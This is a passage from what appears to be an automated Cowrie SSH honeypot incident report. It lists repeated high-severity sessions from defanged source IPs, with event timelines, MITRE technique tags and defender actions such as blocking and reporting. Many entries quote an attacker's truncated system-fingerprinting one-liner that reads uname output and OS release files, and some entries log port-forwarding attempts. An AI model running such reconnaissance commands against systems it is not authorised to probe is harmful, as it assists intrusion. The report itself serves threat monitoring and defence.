| `2026-07-08 20:02:45` | `cowrie.login.success` |
| `2026-07-08 20:02:46` | `cowrie.session.params` |
| `2026-07-08 20:02:46` | `cowrie.command.input` |
| `2026-07-08 20:02:46` | `cowrie.command.input` |
| `2026-07-08 20:02:46` | `cowrie.command.input` |
| `2026-07-08 20:02:46` | `cowrie.command.input` |
| `2026-07-08 20:02:46` | `cowrie.command.input` |
| `2026-07-08 20:02:46` | `cowrie.command.success` |
| `2026-07-08 20:02:46` | `cowrie.command.input` |
| `2026-07-08 20:02:46` | `cowrie.command.input` |
| `2026-07-08 20:02:46` | `cowrie.command.input` |
| `2026-07-08 20:02:46` | `cowrie.command.input` |
| `2026-07-08 20:02:47` | `cowrie.log.closed` |
| `2026-07-08 20:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15376972a541

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:04 |
| **Last Seen** | 2026-07-08 20:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:04:45` | `cowrie.session.connect` |
| `2026-07-08 20:04:46` | `cowrie.client.version` |
| `2026-07-08 20:04:46` | `cowrie.client.kex` |
| `2026-07-08 20:04:47` | `cowrie.login.success` |
| `2026-07-08 20:04:49` | `cowrie.session.params` |
| `2026-07-08 20:04:49` | `cowrie.command.input` |
| `2026-07-08 20:04:49` | `cowrie.command.input` |
| `2026-07-08 20:04:49` | `cowrie.command.input` |
| `2026-07-08 20:04:49` | `cowrie.command.input` |
| `2026-07-08 20:04:49` | `cowrie.command.input` |
| `2026-07-08 20:04:49` | `cowrie.command.success` |
| `2026-07-08 20:04:49` | `cowrie.command.input` |
| `2026-07-08 20:04:49` | `cowrie.command.input` |
| `2026-07-08 20:04:49` | `cowrie.command.input` |
| `2026-07-08 20:04:49` | `cowrie.command.input` |
| `2026-07-08 20:04:49` | `cowrie.log.closed` |
| `2026-07-08 20:04:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2d4e56e1b9f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 20:04 |
| **Last Seen** | 2026-07-08 20:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:04:52` | `cowrie.session.connect` |
| `2026-07-08 20:04:53` | `cowrie.client.version` |
| `2026-07-08 20:04:53` | `cowrie.client.kex` |
| `2026-07-08 20:04:54` | `cowrie.login.success` |
| `2026-07-08 20:04:56` | `cowrie.session.params` |
| `2026-07-08 20:04:56` | `cowrie.command.input` |
| `2026-07-08 20:04:56` | `cowrie.command.input` |
| `2026-07-08 20:04:56` | `cowrie.command.input` |
| `2026-07-08 20:04:56` | `cowrie.command.input` |
| `2026-07-08 20:04:56` | `cowrie.command.input` |
| `2026-07-08 20:04:56` | `cowrie.command.success` |
| `2026-07-08 20:04:56` | `cowrie.command.input` |
| `2026-07-08 20:04:56` | `cowrie.command.input` |
| `2026-07-08 20:04:56` | `cowrie.command.input` |
| `2026-07-08 20:04:56` | `cowrie.command.input` |
| `2026-07-08 20:04:56` | `cowrie.log.closed` |
| `2026-07-08 20:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c94b0afb12c8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 20:06 |
| **Last Seen** | 2026-07-08 20:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:06:58` | `cowrie.session.connect` |
| `2026-07-08 20:06:58` | `cowrie.client.version` |
| `2026-07-08 20:06:58` | `cowrie.client.kex` |
| `2026-07-08 20:07:00` | `cowrie.login.success` |
| `2026-07-08 20:07:01` | `cowrie.session.params` |
| `2026-07-08 20:07:01` | `cowrie.command.input` |
| `2026-07-08 20:07:01` | `cowrie.command.input` |
| `2026-07-08 20:07:01` | `cowrie.command.input` |
| `2026-07-08 20:07:01` | `cowrie.command.input` |
| `2026-07-08 20:07:01` | `cowrie.command.input` |
| `2026-07-08 20:07:01` | `cowrie.command.success` |
| `2026-07-08 20:07:01` | `cowrie.command.input` |
| `2026-07-08 20:07:01` | `cowrie.command.input` |
| `2026-07-08 20:07:01` | `cowrie.command.input` |
| `2026-07-08 20:07:01` | `cowrie.command.input` |
| `2026-07-08 20:07:02` | `cowrie.log.closed` |
| `2026-07-08 20:07:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f8843100a0b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:06 |
| **Last Seen** | 2026-07-08 20:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:06:59` | `cowrie.session.connect` |
| `2026-07-08 20:06:59` | `cowrie.client.version` |
| `2026-07-08 20:06:59` | `cowrie.client.kex` |
| `2026-07-08 20:07:01` | `cowrie.login.success` |
| `2026-07-08 20:07:03` | `cowrie.session.params` |
| `2026-07-08 20:07:03` | `cowrie.command.input` |
| `2026-07-08 20:07:03` | `cowrie.command.input` |
| `2026-07-08 20:07:03` | `cowrie.command.input` |
| `2026-07-08 20:07:03` | `cowrie.command.input` |
| `2026-07-08 20:07:03` | `cowrie.command.input` |
| `2026-07-08 20:07:03` | `cowrie.command.success` |
| `2026-07-08 20:07:03` | `cowrie.command.input` |
| `2026-07-08 20:07:03` | `cowrie.command.input` |
| `2026-07-08 20:07:03` | `cowrie.command.input` |
| `2026-07-08 20:07:03` | `cowrie.command.input` |
| `2026-07-08 20:07:04` | `cowrie.log.closed` |
| `2026-07-08 20:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a0d05522425

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 20:09 |
| **Last Seen** | 2026-07-08 20:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:09:03` | `cowrie.session.connect` |
| `2026-07-08 20:09:03` | `cowrie.client.version` |
| `2026-07-08 20:09:03` | `cowrie.client.kex` |
| `2026-07-08 20:09:05` | `cowrie.login.success` |
| `2026-07-08 20:09:06` | `cowrie.session.params` |
| `2026-07-08 20:09:06` | `cowrie.command.input` |
| `2026-07-08 20:09:06` | `cowrie.command.input` |
| `2026-07-08 20:09:06` | `cowrie.command.input` |
| `2026-07-08 20:09:06` | `cowrie.command.input` |
| `2026-07-08 20:09:06` | `cowrie.command.input` |
| `2026-07-08 20:09:06` | `cowrie.command.success` |
| `2026-07-08 20:09:06` | `cowrie.command.input` |
| `2026-07-08 20:09:06` | `cowrie.command.input` |
| `2026-07-08 20:09:06` | `cowrie.command.input` |
| `2026-07-08 20:09:06` | `cowrie.command.input` |
| `2026-07-08 20:09:07` | `cowrie.log.closed` |
| `2026-07-08 20:09:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2728e2f1c5e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:09 |
| **Last Seen** | 2026-07-08 20:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:09:13` | `cowrie.session.connect` |
| `2026-07-08 20:09:14` | `cowrie.client.version` |
| `2026-07-08 20:09:14` | `cowrie.client.kex` |
| `2026-07-08 20:09:16` | `cowrie.login.success` |
| `2026-07-08 20:09:18` | `cowrie.session.params` |
| `2026-07-08 20:09:18` | `cowrie.command.input` |
| `2026-07-08 20:09:18` | `cowrie.command.input` |
| `2026-07-08 20:09:18` | `cowrie.command.input` |
| `2026-07-08 20:09:18` | `cowrie.command.input` |
| `2026-07-08 20:09:18` | `cowrie.command.input` |
| `2026-07-08 20:09:18` | `cowrie.command.success` |
| `2026-07-08 20:09:18` | `cowrie.command.input` |
| `2026-07-08 20:09:18` | `cowrie.command.input` |
| `2026-07-08 20:09:18` | `cowrie.command.input` |
| `2026-07-08 20:09:18` | `cowrie.command.input` |
| `2026-07-08 20:09:18` | `cowrie.log.closed` |
| `2026-07-08 20:09:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cd8a0e25632

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 20:10 |
| **Last Seen** | 2026-07-08 20:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:10:11` | `cowrie.session.connect` |
| `2026-07-08 20:10:13` | `cowrie.client.version` |
| `2026-07-08 20:10:13` | `cowrie.client.kex` |
| `2026-07-08 20:10:16` | `cowrie.login.success` |
| `2026-07-08 20:10:19` | `cowrie.session.params` |
| `2026-07-08 20:10:19` | `cowrie.command.input` |
| `2026-07-08 20:10:20` | `cowrie.log.closed` |
| `2026-07-08 20:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4b5c5e8212f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 20:11 |
| **Last Seen** | 2026-07-08 20:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:11:07` | `cowrie.session.connect` |
| `2026-07-08 20:11:07` | `cowrie.client.version` |
| `2026-07-08 20:11:07` | `cowrie.client.kex` |
| `2026-07-08 20:11:09` | `cowrie.login.success` |
| `2026-07-08 20:11:10` | `cowrie.session.params` |
| `2026-07-08 20:11:10` | `cowrie.command.input` |
| `2026-07-08 20:11:10` | `cowrie.command.input` |
| `2026-07-08 20:11:10` | `cowrie.command.input` |
| `2026-07-08 20:11:10` | `cowrie.command.input` |
| `2026-07-08 20:11:10` | `cowrie.command.input` |
| `2026-07-08 20:11:10` | `cowrie.command.success` |
| `2026-07-08 20:11:10` | `cowrie.command.input` |
| `2026-07-08 20:11:10` | `cowrie.command.input` |
| `2026-07-08 20:11:10` | `cowrie.command.input` |
| `2026-07-08 20:11:10` | `cowrie.command.input` |
| `2026-07-08 20:11:10` | `cowrie.log.closed` |
| `2026-07-08 20:11:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ce7b6e6edc0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:11 |
| **Last Seen** | 2026-07-08 20:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:11:29` | `cowrie.session.connect` |
| `2026-07-08 20:11:29` | `cowrie.client.version` |
| `2026-07-08 20:11:30` | `cowrie.client.kex` |
| `2026-07-08 20:11:31` | `cowrie.login.success` |
| `2026-07-08 20:11:33` | `cowrie.session.params` |
| `2026-07-08 20:11:33` | `cowrie.command.input` |
| `2026-07-08 20:11:33` | `cowrie.command.input` |
| `2026-07-08 20:11:33` | `cowrie.command.input` |
| `2026-07-08 20:11:33` | `cowrie.command.input` |
| `2026-07-08 20:11:33` | `cowrie.command.input` |
| `2026-07-08 20:11:33` | `cowrie.command.success` |
| `2026-07-08 20:11:33` | `cowrie.command.input` |
| `2026-07-08 20:11:33` | `cowrie.command.input` |
| `2026-07-08 20:11:33` | `cowrie.command.input` |
| `2026-07-08 20:11:33` | `cowrie.command.input` |
| `2026-07-08 20:11:34` | `cowrie.log.closed` |
| `2026-07-08 20:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9093406510d7

| Field | Detail |
|---|---|
| **Source IP** | `65.20.146[.]109` |
| **First Seen** | 2026-07-08 20:12 |
| **Last Seen** | 2026-07-08 20:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:12:05` | `cowrie.session.connect` |
| `2026-07-08 20:12:05` | `cowrie.client.version` |
| `2026-07-08 20:12:05` | `cowrie.client.kex` |
| `2026-07-08 20:12:08` | `cowrie.login.success` |
| `2026-07-08 20:12:08` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:12:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.146[.]109` to AbuseIPDB if not already reported
- [ ] Block `65.20.146[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9079d76bc213

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 20:13 |
| **Last Seen** | 2026-07-08 20:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:13:15` | `cowrie.session.connect` |
| `2026-07-08 20:13:15` | `cowrie.client.version` |
| `2026-07-08 20:13:15` | `cowrie.client.kex` |
| `2026-07-08 20:13:17` | `cowrie.login.success` |
| `2026-07-08 20:13:18` | `cowrie.session.params` |
| `2026-07-08 20:13:18` | `cowrie.command.input` |
| `2026-07-08 20:13:18` | `cowrie.command.input` |
| `2026-07-08 20:13:18` | `cowrie.command.input` |
| `2026-07-08 20:13:18` | `cowrie.command.input` |
| `2026-07-08 20:13:18` | `cowrie.command.input` |
| `2026-07-08 20:13:18` | `cowrie.command.success` |
| `2026-07-08 20:13:18` | `cowrie.command.input` |
| `2026-07-08 20:13:18` | `cowrie.command.input` |
| `2026-07-08 20:13:18` | `cowrie.command.input` |
| `2026-07-08 20:13:18` | `cowrie.command.input` |
| `2026-07-08 20:13:18` | `cowrie.log.closed` |
| `2026-07-08 20:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9a7fa6d9b69

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:13 |
| **Last Seen** | 2026-07-08 20:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:13:40` | `cowrie.session.connect` |
| `2026-07-08 20:13:41` | `cowrie.client.version` |
| `2026-07-08 20:13:41` | `cowrie.client.kex` |
| `2026-07-08 20:13:42` | `cowrie.login.success` |
| `2026-07-08 20:13:44` | `cowrie.session.params` |
| `2026-07-08 20:13:44` | `cowrie.command.input` |
| `2026-07-08 20:13:44` | `cowrie.command.input` |
| `2026-07-08 20:13:44` | `cowrie.command.input` |
| `2026-07-08 20:13:44` | `cowrie.command.input` |
| `2026-07-08 20:13:44` | `cowrie.command.input` |
| `2026-07-08 20:13:44` | `cowrie.command.success` |
| `2026-07-08 20:13:44` | `cowrie.command.input` |
| `2026-07-08 20:13:44` | `cowrie.command.input` |
| `2026-07-08 20:13:44` | `cowrie.command.input` |
| `2026-07-08 20:13:44` | `cowrie.command.input` |
| `2026-07-08 20:13:45` | `cowrie.log.closed` |
| `2026-07-08 20:13:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b632830f8d

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-07-08 20:13 |
| **Last Seen** | 2026-07-08 20:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:13:59` | `cowrie.session.connect` |
| `2026-07-08 20:14:00` | `cowrie.client.version` |
| `2026-07-08 20:14:00` | `cowrie.client.kex` |
| `2026-07-08 20:14:03` | `cowrie.login.success` |
| `2026-07-08 20:14:04` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9289553ab5d

| Field | Detail |
|---|---|
| **Source IP** | `124.152.90[.]68` |
| **First Seen** | 2026-07-08 20:14 |
| **Last Seen** | 2026-07-08 20:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:14:14` | `cowrie.session.connect` |
| `2026-07-08 20:14:15` | `cowrie.client.version` |
